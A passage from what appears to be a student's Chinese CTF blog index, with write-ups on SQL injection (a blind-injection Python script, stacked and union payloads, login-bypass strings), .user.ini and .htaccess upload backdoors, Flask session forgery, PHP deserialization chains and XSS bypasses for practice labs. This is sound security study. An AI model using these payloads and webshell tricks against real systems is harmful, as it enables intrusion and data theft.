World","slug":"CISCN2019-华北赛区-Day2-Web1-Hack-World","date":"2020-07-03T06:02:01.000Z","updated":"2020-07-03T08:14:22.833Z","comments":true,"path":"2020/07/03/CISCN2019-华北赛区-Day2-Web1-Hack-World/","link":"","permalink":"/2020/07/03/CISCN2019-华北赛区-Day2-Web1-Hack-World/","excerpt":"","text":"暑假第一次更博，目标每天至少buu五道题和两篇博客。这道题主要是想记录一下自己第一次尝试写的脚本可以用异或注入。简单介绍下原理：当两边相同的时候，输出值为0，如1^1=0，不同的时候，输出值为1，如1^0=1。于是可以用脚本一位一位判断过去。第一个自己写的脚本（其实是先看了一遍思路然后再写的）：有几个注意点：1、用括号或者tab都可以代替空格2、网站用了waf所以有刷新时间限制，建议加一个sleep函数，我第一次的脚本可能就是因为这个原因跑出了错误的结果。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[{"name":"sql 异或注入","slug":"sql-异或注入","permalink":"/tags/sql-异或注入/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"WHUCTF2020-Easy_sqli","slug":"WHUCTF2020-Easy_sqli","date":"2020-05-30T02:46:01.000Z","updated":"2020-06-06T09:02:12.274Z","comments":true,"path":"2020/05/30/WHUCTF2020-Easy_sqli/","link":"","permalink":"/2020/05/30/WHUCTF2020-Easy_sqli/","excerpt":"","text":"一、Easy_sqli一直不会写脚本，正好借这道题学习一下如何写脚本底下会显示sql语句，但是不会报错。简单测试发现该题还进行了黑名单过滤，可采用双写方式绕过，如selselectect。采用布尔盲注，利用ascii(substr())组合来逐位爆破数据库、表名、列名以及字段。 import requestsurl = ‘http://218.197.154.9:10011/login.php#&#39; pwd=’ssss’username=’’ #database namedef dabasename(): database=’’ for a in range(12): # print(database) for i in range(128,0,-1): # print(chr(101)) username=&quot;admin&#39; and &quot;+&quot;ascii(substr(database(),{},1))&lt;&quot;.format(len(database)+1)+str(i)+&quot;#&quot; # print(username) data={&#39;user&#39;:username,&#39;pass&#39;:pwd} r= requests.post(url,data) if &#39;success&#39; not in r.text: database+=chr(i) print(&#39;database ==&gt; &#39;,database) break #print(r.text)database=’eazy_sql’ def table_name(): table_name_list=[] for a in range(5): table_name=’’ for b in range(30): ori = len(table_name) for i in range(128,0,-1): # print(chr(101)) username=&quot;admin&#39; and &quot;+&quot;ascii(substr((selselectect table_name frfromom infoorrmation_schema.tables whwhereere table_schema=&#39;easy_sql1&#39; limit {},1),{},1))&lt;&quot;.format(len(table_name_list),len(table_name)+1)+str(i)+&quot;#&quot; #print(username) data={&#39;user&#39;:username,&#39;pass&#39;:pwd} r= requests.post(url,data) if &#39;success&#39; not in r.text: table_name+=chr(i) print(&#39;table_name ==&gt; &#39;,table_name) #print(r.text) break # if len(table_name)==ori: # break table_name_list.append(table_name) print(table_name_list) def column_name(): col_name_list=[] for a in range(5): col_name=’f111114g’ for b in range(30): ori = len(col_name) for i in range(128,0,-1): # print(chr(101)) username=&quot;admin&#39; and &quot;+&quot;ascii(substr((selselectect column_name frfromom infoorrmation_schema.columns whwhereere table_name=&#39;f1ag_y0u_wi1l_n3ver_kn0w&#39; limit {},1),{},1))&lt;&quot;.format(len(col_name_list),len(col_name)+1)+str(i)+&quot;#&quot; #print(username) data={&#39;user&#39;:username,&#39;pass&#39;:pwd} r= requests.post(url,data) if &#39;success&#39; not in r.text: col_name+=chr(i) print(&#39;col_name ==&gt; &#39;,col_name) #print(r.text) break # if len(col_name)==ori: # break col_name_list.append(col_name) print(col_name_list) def flag(): col_name=’f111114g’ flag=’’ table_name=’f1ag_y0u_wi1l_n3ver_kn0w’ for b in range(30): ori = len(flag) for i in range(128,0,-1): # print(chr(101)) username=&quot;admin&#39; and &quot;+&quot;ascii(substr((selselectect {} frfromom {} limit 0,1),{},1))&lt;&quot;.format(col_name,table_name,len(flag)+1)+str(i)+&quot;#&quot; #print(username) data={&#39;user&#39;:username,&#39;pass&#39;:pwd} r= requests.post(url,data) if &#39;success&#39; not in r.text: flag+=chr(i) print(&#39;flag ==&gt; &#39;,flag) #print(r.text) break # if len(col_name)==ori: # break print(flag) #dabasename() #table_name() #column_name()flag() 下次遇到要写脚本的题会尝试去写一下 参考链接：https://blog.csdn.net/weixin_43826280/article/details/106407407","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"/tags/CTF/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"SUCTF 2019-CheckIn","slug":"SUCTF-2019-CheckIn","date":"2020-05-29T08:15:37.000Z","updated":"2020-05-29T11:48:49.386Z","comments":true,"path":"2020/05/29/SUCTF-2019-CheckIn/","link":"","permalink":"/2020/05/29/SUCTF-2019-CheckIn/","excerpt":"","text":"经过几次简单的测试可以发现：后台是通过exif_imagetype函数判断图像的类型的，且文件中不能包含&lt;?。这里新了解到了一种方法-.user.ini：首先介绍php.ini文件，php有很多配置，并可以在php.ini中设置。在每个正规的网站里，都会由这样一个文件，而且每次运行PHP文件时，都会去读取这个配置文件，来设置PHP的相关规则。这些配置可以分为四种：我感觉是按重要程度分类了，比如关乎到系统一类的配置，那一类的全部配置，都属于“PHP_INI_SYSTEM”。它只能在，像php.ini这样的“厉害”的文件里可以设定。而其他的三类不怎么重要的配置，除了可以在php.ini中设定外，还可以在其它类似的文件中设定，其中就包括.user.ini文件。 实际上，除了PHP_INI_SYSTEM以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。而且，和php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。 这里就很清楚了，.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置） 其中有两个配置，可以用来制造后门：auto_append_file、auto_prepend_file指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中： auto_prepend_file=test.jpg 那么当我们访问此目录下的任何一个文件时，都会去包含test.jpg 因为后台用exif_imagetype函数检测文件类型，所以我们在文件前加上图片的特征，来绕过检测。GIF89aauto_prepend_file=a.jpg随后制作一个图片马或者分别上传.user.ini和a.jpg都行最后在网页端执行： 参考链接：https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.htmlhttps://blog.csdn.net/weixin_44077544/article/details/102688564","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[{"name":"upload","slug":"upload","permalink":"/tags/upload/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[HCTF 2018]admin","slug":"HCTF-2018-admin","date":"2020-05-27T05:33:56.000Z","updated":"2020-05-28T08:53:14.488Z","comments":true,"path":"2020/05/27/HCTF-2018-admin/","link":"","permalink":"/2020/05/27/HCTF-2018-admin/","excerpt":"","text":"进去是一个普通的网站，有登录和注册的功能，在注释里面有提示： you are not admin ，猜想题目是让我们登录成admin，然后出flag，于是想到change password功能，可能可以通过改密码功能的漏洞改掉admin密码，然后以admin登录。于是随便注册一个账号登录，在change password页面发现注释里给出了网站项目的源码： 访问查看源码wp上的源码看起来更清楚，这里就直接搬运一下wp里的源码： return redirect(url_for(‘index’)) return render_template(‘change.html’, title = ‘change’, form = form) 解法一：flask session 伪造在Web中，session是认证用户身份的凭证，它具备如下几个特点：1、用户不可以任意篡改2、A用户的session无法被B用户获取也就是说，session的设计目的是为了做用户身份认证。但是，很多情况下，session被用作了别的用途，将产生一些安全问题。在传统PHP开发中，$_SESSION变量的内容默认会被保存在服务端的一个文件中，通过一个叫“PHPSESSID”的Cookie来区分用户。这类session是“服务端session”，用户看到的只是session的名称（一个随机字符串），其内容保存在服务端。然而，并不是所有语言都有默认的session存储机制，也不是任何情况下我们都可以向服务器写入文件。所以，很多Web框架都会另辟蹊径，比如Django默认将session存储在数据库中，而对于flask这里并不包含数据库操作的框架，就只能将session存储在cookie中。因为cookie实际上是存储在客户端（浏览器）中的，所以称之为“客户端session”。 flask的session是存储在客户端cookie中的，而且flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。我们可以用python脚本把flask的session解密出来，但是如果想要加密伪造生成我们自己的session的话，还需要知道flask用来签名的SECRET_KEY，在github源码里找找，可以在config.py里发现下面代码显然ckj123应该就是SECRET_KEY了然后就是在github上找一个解密加密的脚本，在解密之后把name中的值换成admin在加密就成功的伪造了session。步骤如下：bp抓包获取cookie，通过flask_session_cookie_manager解码，再把name改成admin即可随后把我们伪造的cookie填上去即可获得flag： 还有的解法暂时不去尝试了。 参考链接：https://www.jianshu.com/p/f92311564ad0https://www.leavesongs.com/PENETRATION/client-session-security.htmlhttps://www.cnblogs.com/mech/p/12890705.html","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[{"name":"flask session伪造","slug":"flask-session伪造","permalink":"/tags/flask-session伪造/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"堆叠注入","slug":"堆叠注入","date":"2020-05-20T13:15:40.000Z","updated":"2020-05-20T13:37:17.636Z","comments":true,"path":"2020/05/20/堆叠注入/","link":"","permalink":"/2020/05/20/堆叠注入/","excerpt":"","text":"堆叠注入原理在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。 1、2019强网杯随便注单引号注入，正常流程注入发现过滤了很多关键词，尝试堆叠注入，1’show databases;# 成功：接着尝试爆表，1’show tables;#：查询字段，0’;show columns from 1919810931114514;#(注意对以数字为表名的表进行操作时，需要加上`符号)后面是学到的新姿势）可以看到1919810931114514中有我们想要的flag字段，因为这里有两张表，回显内容肯定是从words这张表回显的，那怎么样才能让它回显flag所在的表呢？从上面的查询结果来看，words有两列，id和data，而1919810931114514只有flag一个字段。虽然有强大的正则过滤，但没有过滤alert和rename关键字。下面是从大佬那里学到的骚姿势 ： 将words表改名为word1或者其他名字将1919810931114514表改为words表在新的words表里插入一列id将flag列改名为data 构造payload：1’;rename table words to word1;rename table 1919810931114514 to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);# （遇到再补…）","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"PHP反序列化","slug":"PHP反序列化","date":"2020-04-30T06:50:14.000Z","updated":"2020-04-30T07:01:00.658Z","comments":true,"path":"2020/04/30/PHP反序列化/","link":"","permalink":"/2020/04/30/PHP反序列化/","excerpt":"","text":"一、序列化与反序列化PHP序列化是将一个对象、数组、字符串等转化为字节流便于传输，比如跨脚本等。而PHP反序列化是将序列化之后的字节流还原成对象、字符、数组等。但是PHP序列化是不会保存对象的方法。形象化理解就像物流的过程。你想把一张桌子通过从a–&gt;b，一张桌子肯定不好运输，因此需要把它拆开（这个拆的过程就是序列化）；等到达了b需要把他组装起来（装的过程就是反序列化）。二、PHP反序列化漏洞PHP类中有一种特殊函数体的存在叫魔法函数，magic函数命名是以符号开头的，比如 construct, destruct, toString, sleep, wakeup等等。这些函数在某些情况下会自动调用，比如construct当一个对象创建时被调用，destruct当一个对象销毁时被调用，toString当一个对象被当作一个字符串使用。而在反序列化时，如果反序列化对象中存在魔法函数，使用unserialize()函数同时也会触发。这样，一旦我们能够控制unserialize()入口，那么就可能引发对象注入漏洞。例： sleep() //使用serialize时触发destruct() //对象被销毁时触发 call() //在对象上下文中调用不可访问的方法时触发callStatic() //在静态上下文中调用不可访问的方法时触发 get() //用于从不可访问的属性读取数据set() //用于将数据写入不可访问的属性 isset() //在不可访问的属性上调用isset()或empty()触发unset() //在不可访问的属性上使用unset()时触发 toString() //把类当作字符串使用时触发__invoke() //当脚本尝试将对象调用为函数时触发三、实例1、 首先找到输出flag处，在Read中的_invoke()函数。想要触发invoke函数需要将一个对象调用为函数，很明显是在Test中的_get()函数处。想要触发get函数，就要访问不存在的属性，很明显是Show中的_toString()函数。接下来就是开始构造pop链： //&lt;?phpclass Read{ public $token; public $token_flag; function __construct(){ $this-&gt;token = &amp;$this-&gt;token_flag; //引用 }}class Show{ public $source; public $str;}class Test{ public $params;}$p3 = new Read();$p2 = new Test();$p2-&gt;params = $p3;$p4 = new Show();$p4-&gt;str = array(‘str’=&gt;$p2);$exp = new Show();$exp-&gt;source = $p4;echo serialize($exp);?&gt; 2、攻防世界 Web_php_unserialize还是先找输出flag的地方，发现只有在Demo类的_destruct()函数处有输出点，无疑要将输出的$this-&gt;file的值变为fl4g.php，到这里思路已经很清晰了：先对Demo类序列化，base64加密后get传参到var就行了。其中还有一点要注意的就是执行反序列化时会自动调用wakeup函数从而将file的值重置为index.php，所以这里要绕过wakeup函数。（当成员属性数目大于实际数目时可绕过wakeup方法，正则匹配可以用+号来进行绕过。）Payload：//&lt;?phpclass Demo {private $file = ‘index.php’;//protected $file1 = ‘index.php’;public function construct($file) { $this-&gt;file = $file; //$this-&gt;file1 = $file1;}function destruct() { echo @highlight_file($this-&gt;file, true);}function __wakeup() { if ($this-&gt;file != ‘index.php’) { //the secret is in the fl4g.php $this-&gt;file = ‘index.php’; }}}$a=new Demo(‘fl4g.php’);$b=serialize($a);$b=str_replace(‘O:4’,’O:+4’,$b);$b=str_replace(‘1:{‘,’2:{‘,$b);echo base64_encode($b); 3、安恒月赛2020年DASCTF——四月春季战 Ezunserialize 显然flag通过C类的file_get-contents()函数输出，且注意到在B类存在字符串拼接，所以这里将b转换成c类的对象就会触发toString函数。但是这里只实例化了A类，所以要将A的属性实例化为B类。POP链构造完成：$a = new A();$b = new B();$c = new C();$c-&gt;c = “flag.php”;$b-&gt;b = $c;$a-&gt;username = “1”;$a-&gt;password = $b;echo serialize($a);得到：O:1:”A”:2:{s:8:”username”;s:1:”1”;s:8:”password”;O:1:”B”:1:{s:1:”b”;O:1:”C”:1:{s:1:”c”;s:8:”flag.php”;}}}接下来还有字符逃逸的问题：核心思想：过滤导致的字符串位数增加或减少，不会导致序列化中变量名字符数改变,导致逃逸出新的对象 同时对象逃逸的特点是过滤函数放在了序列化函数之后。 read函数，将\\0\\0\\0 (6个字符) 替换成 chr(0)*chr(0) (3个字符)，所以这里逃逸处3个字符我们要逃逸出的字符串是“;s:8:”password”;s:xx:” 共23位（因为这里payload打在password里，所以xx一定是两位数） 为什么是这个字符串在下面解释 因为一组逃逸出三个字符，所以这里共需逃逸八组，也就是\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0 （24个\\0）将其传入payload1中 只序列化后的结果：O:1:”A”:2:{s:8:”username”;s:48:”\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0”;s:8:”password”;s:72:”A”;s:8:”password”;O:1:”B”:1:{s:1:”b”;O:1:”C”:1:{s:1:”c”;s:8:”flag.php”}}”;} 经过函数过滤后的结果：O:1:”A”:2:{s:8:”username”;s:48:”**“;s:8:”password”;s:72:”A”;s:8:”password”;O:1:”B”:1:{s:1:”b”;O:1:”C”:1:{s:1:”c”;s:8:”flag.php”}}”;} （实际每个*号前后有两个空字符，这里未显示） 可以看到，反序列化过程中，在读入username的值时，读入48位，从第一个 空*空 开始读，**“;s:8:”password”;s:72:”A （因为总逃逸的字符串有24位，需要逃逸的只有23位，这里加上一个A字符，凑成24位） 读完此时，结束，发现原本的password属性被吞，但因为序列化字符串中类里面的变量数是2，所以此时继续读一个变量，读入我们传的password，也就是读出了我们希望传入的password，这时新对象即逃逸出来构成对象逃逸 成功完成攻击，读取出flag值 整个的payload就是：?a=\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&amp;b=A”;s:8:”password”;O:1:”B”:1:{s:1:”b”;O:1:”C”:1:{s:1:”c”;s:8:”flag.php”}} 4、[安洵杯 2019]easy_serialize_php 根据代码中的提示，phpinfo中可能存在线索，于是令f=phpinfo查看： 可知flag应该在d0g3_f1ag.php中，要用show_image访问后面就有点搞不明白了，看了别人的wp想了很久才搞清楚。 过滤函数filter()是对serialize($_SESSION)进行过滤，滤掉一些关键字正常传img参数进去会被sha1加密，我们应该用别的方法控制$_SESSION中的参数。本来挺好的序列化的字符串，按某种去掉了一些关键字，本身就不对，本身就涉及到可能破坏原有结构而无法正常反序列化的问题。这里是利用反序列化长度逃逸控制了img参数。之前有一道题目是关键字替换导致字符串长度变长，把后面的原有参数挤出去了，本题是关键字被置空导致长度变短，后面的值的单引号闭合了前面的值的单引号，导致一些内容逃逸。。 extract后覆盖了两个没用的属性，但是后面又强制加了一个我们不可控的img属性 根据源码，我们先对f传参phpinfo 构造payload来对 /d0g3_f1ag.php读取。 ;s:14:”phpflagphpflag”;s:7:”xxxxxxx”;s:3:”img”;s:20:”L2QwZzNfZmxsbGxsbGFn”;} 解释一下：这里首先phpflagphpflag会被过滤为空，吃掉一部分值 $serialize_info的内容为 a:2:{s:7:””;s:48:”;s:7:”xxxxxxx”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}”;s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw==”; 刚好把后面多余的img部分截断掉 payload: _SESSION[phpflag]=;s:7:”xxxxxxx”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;} 读取/d0g3_fllllllagpayload: _SESSION[phpflag]=;s:14:”phpflagphpflag”;s:7:”xxxxxxx”;s:3:”img”;s:20:”L2QwZzNfZmxsbGxsbGFn”;} 注：这道题确实没有完全搞明白，有很多细节的地方现在还理解不了。四、参考链接https://www.cnblogs.com/karsa/p/12775854.htmlhttps://www.gem-love.com/ctf/2275.htmlhttps://www.freebuf.com/articles/web/167721.htmlhttps://blog.csdn.net/weixin_45645113/article/details/105309695https://www.cnblogs.com/wangtanzhi/p/12261610.htmlhttps://blog.csdn.net/chasingin/article/details/104189711","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"2019极客大挑战","slug":"2019极客大挑战","date":"2020-04-13T14:17:44.000Z","updated":"2020-04-19T03:37:25.042Z","comments":true,"path":"2020/04/13/2019极客大挑战/","link":"","permalink":"/2020/04/13/2019极客大挑战/","excerpt":"","text":"1、Havefun签到题。根据源码，get提交cat=dog即可2、secret fileF12看到hint：访问打开secret尝试bp发现下一个hint，访问显然是不可能直接访问flag.php的，根据这里的php可知file中不能包括file、tp、input、data，虽然不是很懂但是很容易想到之前遇到过的php://filter伪协议结合base64实现文件读取：得到一串base64编码，解码得到flag3、PHP1首先访问index.php.bak,无效。于是www.zip后面就是php了，涉及到序列化及反序列化的知识点。index.php里面是一个简单的get和反序列化4、Easysql1万能密码常用万能密码admin’ –admin’ #admin’/‘ or 1=1–‘ or 1=1#‘ or 1=1/‘) or ‘1’=’1–‘) or (‘1’=’1– 5、Knife菜刀连接即可。flag就在根目录。6、http找到secret.php然后改header头就行了，没什么难度。7、BuyFlag右上角菜单访问pay.php，bp抓包发现：Password不能是数字但是要等于404并且金钱要等与100000000Post：password=404a&amp;money=1e9注：因为100000000会显示太长所以这里用科学计数法绕过，还有一点就是要把cookie里的user改为1，根据提示很容易猜出来。8、upload一句话木马菜刀连接直接找9、LoveSQL万能密码登陆成功，但是得到了一串似乎并没有什么用的密码还是按常规套路来，首先测有几列：admin’ order by 3#&amp;password=1接着测回显列（注意id要写一个比较离谱的）测数据库名和版本：测表名union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1 %23union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’l0ve1ysq1’ %23查询数据union select 1,2,group_concat(concat_ws(0x7e,username,password)) from geek.l0ve1ysq1 %2310、BabySQL11、HardSQL参考链接：https://blog.csdn.net/SopRomeo/article/details/104041233","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"BJDCTF2nd-web-2","slug":"BJDCTF2nd-web-2","date":"2020-04-13T14:17:18.000Z","updated":"2020-04-19T03:13:15.019Z","comments":true,"path":"2020/04/13/BJDCTF2nd-web-2/","link":"","permalink":"/2020/04/13/BJDCTF2nd-web-2/","excerpt":"","text":"4、假猪套天下第一是一个登陆界面，首先burp抓包发现L0g1n.php，访问显示如下：又刷新了一遍变成了：猜测是要修改时间才能访问。我直接在cookie里的time值后面加了一个0。后面就是加各种header头，需要注意的就是伪造的ip头是client-ip,需要多试几遍。base64。5、简单注入没思路。。。看了wp发现居然线索是藏在robots.txt里的，好久没遇到藏在robots.txt里的题所以居然忘记尝试了。根据提示访问hint.txt：可能存在sql注入首先fuzz一波看下过滤了什么（）看不懂，根据大佬wp提示，没有过滤\\，由于引号被过滤，所以我们可以使得username=admin&amp;password=or 1#发现回显发生变化接下来就是上脚本了，这里因为看不懂我就不放了，还需要学习。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"BJDCTF2nd-web","slug":"BJDCTF2nd-web","date":"2020-03-29T03:16:18.000Z","updated":"2020-03-29T03:41:47.336Z","comments":true,"path":"2020/03/29/BJDCTF2nd-web/","link":"","permalink":"/2020/03/29/BJDCTF2nd-web/","excerpt":"","text":"1、fake google输入什么就会回显什么，在注释里看到给的提示：百度可知是SSTI（模板注入），没接触过所以首先学习一下这方面的知识：和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容。输入NaN发现回显为ax，说明存在模板注入输入：来查看根目录，发现flag在根目录里：接下来把ls换成cat /flag就可得到flag：另一种比较方便的方法是用tplmap，傻瓜式工具还是比手工香：2、old hack没发现什么有价值的信息，除了告诉我们用了TP5想办法构造一个ThinkPHP的报错看一下详细版本：http://d701e9e5-05ba-44f3-9d85-a419b028ef7b.node3.buuoj.cn/?s=1（“t框架有s参数可以加载模块”，不知道这句话什么意思，不过我试了下换成别的字母确实不会报错。）报错后看到了thinkphp的详细版本：然后就是百度搜一个这个版本的执行漏洞就行了3、duangshellswp显然是提示了，以前遇到过此类题目，是vim非正常关闭时会产生一个swp文件。这里先下载备份文件url/.index.php.swp，然后用vim恢复：一开始看到这里还觉得蛮简单，后来看了wp才知道这里要用到反弹shell的操作。因为exec()不会回显，反弹shell能够解决而且又没有过滤curl。可能是靶机不能访问外网，我的虚拟机上一直没有回显。应该是要在内网开一台虚拟机再操作的，这里就直接放上模仿的师傅wp了。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"sqlilabs union联合查询注入","slug":"sqlilabs-union联合查询注入","date":"2020-03-15T11:21:48.000Z","updated":"2020-03-15T11:35:19.108Z","comments":true,"path":"2020/03/15/sqlilabs-union联合查询注入/","link":"","permalink":"/2020/03/15/sqlilabs-union联合查询注入/","excerpt":"","text":"Less-1注：– 在sql中表示注释，但是在url中发送请求时会把最后的空格去掉，所以这里用–+（+号会被转换为空格）来表示注释。在1后面加上’发现报错，推测这里存在注入点从错误信息中我们可以知道是单引号的匹配出了问题，也就是说我们添加的单引号成功被数据库解析，那么我们就可以通过闭合这个id这个参数，然后插入自己构造的sql语句实施攻击。接着用order by 语句判断表中一共有几列数据：http://localhost/sqli-labs-php7-master/Less-1/?id=1’order by 3–+当order by 4时报错，说明一共有三列。接着要确定有哪几列会显示出来：http://localhost/sqli-labs-php7-master/Less-1/?id=111’ union select 1,2,3 –+发现页面输出了2和3，说明有两个显示位。然后就利用sql语句爆破出数据库名，表名，列名，字段信息。 爆库：http://localhost/sqli-labs-php7-master/Less-1/?id=111%27%20%20union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata%20--+ 查询security内的所有表名：http://localhost/sqli-labs-php7-master/Less-1/?id=111%27%20%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%27security%27--+ 爆user表的列：http://localhost/sqli-labs-php7-master/Less-1/?id=111%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=%27users%27%20--+ 爆所有的用户名和密码：http://localhost/sqli-labs-php7-master/Less-1/?id=111%27%20union select 1,group_concat(username),group_concat(password) from users –+Less-2根据报错语句可知此处是数字型注入。用和第一关相同的方式成功绕过。Less-3：由报错信息可得后台查询语句应为select from where id = (‘$id’) LIMIT 0,1后面查询语句同上Less-4:当输入id=1”时报错，根据错误信息可判断查询语句是id=(“$id”)，后面同上。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"upload-labs","slug":"upload-labs","date":"2020-02-19T10:19:24.000Z","updated":"2020-02-19T10:37:07.890Z","comments":true,"path":"2020/02/19/upload-labs/","link":"","permalink":"/2020/02/19/upload-labs/","excerpt":"","text":"Uploads-labsPass-01：bp抓包将jpg后缀改成php或者使用noscript插件禁用js即可。Pass-02：首先查看源码，发现本关好像只判断content type，所以bp抓包修改即可。Pass-03：查看源码可以看到过滤了asp、aspx、php、jsp。但是后面的有点看不明白。如果只看前面过滤的这四个那么可以尝试用php1、php2这种来绕过。幸好这里这种方法是可行的，不然gg：Pass-04：看了下网上的做法，这里几乎过滤了所有的后缀，除了htaccess，所以首先上传一个.htaccess文件包含下面的内容：SetHandler application/x-httpd-php。这句话可以让上传的所有文件都解析成php（11.jpg是指下面要传的文件）直接bp抓包修改：接着把11.jpg这个文件提交：然后直接访问即可Pass-05：这一关加上了对htaccess的过滤，但是没有限制大小写，所以尝试用大小写绕过：可能是服务器出了点问题，上传的文件都不能成功执行，但是问题不大，只要学方法就行了。Pass-06：这一关少了首位去空这一限制，随便试了个. php就成功了。Pass-07：这一关少了去除文件名末尾的点，那就试试在最后加个点。成功。Pass-08：这一关少了去除字符串。但是不太明白是啥意思，一开始以为要转码进行绕过，看了网上的才知道是咋回事。这里没有对后缀名进行去::$DATA处理，利用windows特性，可在后缀名中加” ::$DATA”绕过：Pass-09：查看源码，发现之前几关出现的限制全都有。但这里可以利用首尾去空和删除文件末尾的点来构造：test.php. .,这样在过滤之后去掉了最后的点和空格，剩下了test.php.，就能绕过了。Pass-10：源码中有这样一句话$file_name = str_ireplace($deny_ext,””, $file_name);网上看了下知道这是将后缀替换成空的，所以和xss靶场一样重复写就行了：pphphpPass-11：这一关是白名单，只允许上传gif、png、jpg。源码还有这一行：$img_path=$_GET[‘save_path’].”/“.rand(10,99).date(“YmdHis”).”.”.$file_ext;Get方式上传一个变量save_path和随机日期来组成文件上传地址，这样就实现了对文件名的控制。但是我们可以利用00截断：Pass-12：这一关就是将上一关的get改成了post，一样是00绕过，但是这里需要在二进制里修改，因为post不像get可以自动解码Pass-13：开始模仿大佬操作，首先学习制作一个图片马。制作好以后上传即可。由于本关根据前两个字节判断文件类型，所以随便构造一个就行。Pass-14：本关的重点是这个getimagesize（）函数绕过方法和上一关相同。Pass-15：这里用到php_exif模块来判断文件类型，还是直接就可以利用图片马就可进行绕过。注：exif_imagetype() 读取一个图像的第一个字节并检查其签名。Pass-16：此关首先判断文件的后缀名、content-type，然后用imagecreatefromjpeg函数判断函数是否是jpg函数（还有png和gif就略去不说了），如果是的话对图片进行二次渲染。二次渲染可能会导致我们之前插入的php语句被删去，这里只要找到二次渲染后留下的那部分把php语句插在那里就行了。别的也没什么好说的了，主要是已经不太懂了。Pass-17：这里先将文件上传到服务器，然后通过rename修改名称，再通过unlink删除文件，因此可以通过条件竞争的方式在unlink之前，访问webshell。方法就是用bp不断发送并不断访问，在大量的尝试中可能会有几次是访问成功的。Pass-18：本关对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功。Pass-19：看了网上的很多帖子都基本上不相同，就不尝试了，超出自身能力了。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"xss-跨站脚本攻击2","slug":"xss-跨站脚本攻击2","date":"2020-02-14T16:07:09.000Z","updated":"2020-02-14T16:31:23.515Z","comments":true,"path":"2020/02/15/xss-跨站脚本攻击2/","link":"","permalink":"/2020/02/15/xss-跨站脚本攻击2/","excerpt":"","text":"注：答案前的//请忽略。level8：首先看一下代码。这道题是添加一个东西会显示在这里：所以很明显是添加JavaScript:alert(‘1’),但是javascript被替换了。所以这里用老办法是不行的。要把代码转换为html字符实体，这样在执行的时候还是会转换回原来的字符，也就成功的绕过了。level9：这里无论添加什么下面